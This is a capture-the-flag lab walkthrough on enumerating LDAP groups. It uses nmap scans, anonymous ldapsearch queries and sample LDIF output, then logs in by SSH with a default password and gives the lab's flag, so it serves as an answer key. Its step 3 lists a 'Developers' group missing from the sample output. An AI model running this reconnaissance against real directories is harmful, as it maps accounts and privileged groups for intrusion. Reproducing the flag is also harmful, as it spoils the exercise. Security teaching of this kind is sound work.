# Lab 7.5: LDAP Group Enumeration
## Learning Objectives
- Enumerate groups and memberships
- Understand group discovery
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before enumerating groups.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify LDAP service is running:**
   ```bash
   nmap -p 389,636 <target_ip>
   ```

### Step 2: Enumerate Groups

Use ldapsearch to enumerate groups in the LDAP directory.

**Detailed Steps:**

1. **Verify ldapsearch is installed:**
   ```bash
   which ldapsearch
   ```

2. **Enumerate groups:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=group)"
   ```
   
   Replace `<target_ip>` with your actual target IP and `dc=example,dc=com` with the discovered base DN (e.g., `ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=group)"`)

   **Command breakdown:**
   - `ldapsearch`: LDAP search tool
   - `-x`: Simple authentication (anonymous bind)
   - `-H ldap://<target_ip>`: LDAP server URL
   - `-b "dc=example,dc=com"`: Base DN (discovered from previous enumeration)
   - `"(objectClass=group)"`: Search filter (finds group objects)

3. **Expected output:**
   ```
   # extended LDIF
   #
   # LDAPv3
   # base <dc=example,dc=com> with scope subtree
   # filter: (objectClass=group)
   # requesting: ALL
   #
   
   # Domain Admins, Groups, example.com
   dn: cn=Domain Admins,ou=Groups,dc=example,dc=com
   objectClass: group
   objectClass: top
   cn: Domain Admins
   member: cn=admin,ou=Users,dc=example,dc=com
   member: cn=user1,ou=Users,dc=example,dc=com
   
   # Domain Users, Groups, example.com
   dn: cn=Domain Users,ou=Groups,dc=example,dc=com
   objectClass: group
   objectClass: top
   cn: Domain Users
   member: cn=admin,ou=Users,dc=example,dc=com
   member: cn=user1,ou=Users,dc=example,dc=com
   member: cn=test,ou=Users,dc=example,dc=com
   
   # search result
   search: 2
   result: 0 Success
   
   # numResponses: 3
   ```

4. **Extract just group names:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=group)" | grep "^cn:"
   ```

### Step 3: Analyze Results

Review the enumeration output to identify groups and their members.

**Detailed Steps:**

1. **Look for group names (cn attributes):**
   - `cn: Domain Admins` - Administrative group
   - `cn: Domain Users` - Standard user group
   - `cn: Developers` - Development team group

2. **Look for member attributes:**
   - `member: cn=admin,ou=Users,dc=example,dc=com` - Admin is a member
   - `member: cn=user1,ou=Users,dc=example,dc=com` - User1 is a member

3. **Document group memberships:**
   ```
   Discovered Groups:
   - Domain Admins
     Members: admin, user1
   - Domain Users
     Members: admin, user1, test
   - Developers
     Members: user1, test
   ```

4. **Identify privileged groups:**
   - Groups with "Admin" in name are typically privileged
   - Groups with "Domain" prefix are often important
   - Note which users are in privileged groups

5. **Alternative: Query specific attributes:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=group)" cn member
   ```

### Step 4: Access Flag

The flag is located in /tmp/flag.txt on the LDAP server.

**Detailed Steps:**

1. **If you have shell access:**
   ```bash
   ssh admin@<target_ip>
   # Password: password
   ```

2. **Navigate to flag location:**
   ```bash
   cat /tmp/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{ldap_gr0up_3num}
   ```

4. **Alternative: Check if flag references discovered groups:**
   - Flag may contain group information
   - Check enumeration output for flag references

5. **Verify file exists:**
   ```bash
   ls -la /tmp/flag.txt
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{ldap_gr0up_3num}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and LDAP service accessibility
- ✅ Enumerated groups using ldapsearch with objectClass=group filter
- ✅ Identified base DN (dc=example,dc=com) from previous enumeration
- ✅ Analyzed results and extracted group names (cn attributes)
- ✅ Identified group members from member attributes
- ✅ Documented group memberships and privileged groups
- ✅ Successfully accessed flag in /tmp/flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Group enumeration reveals organizational structure
- objectClass=group filter finds group objects
- Member attributes show which users belong to groups
- Privileged groups indicate high-value targets
- Understanding group memberships helps plan attacks
## Hints
1. Use objectClass=group filter
2. Look for member attributes
3. Groups show membership information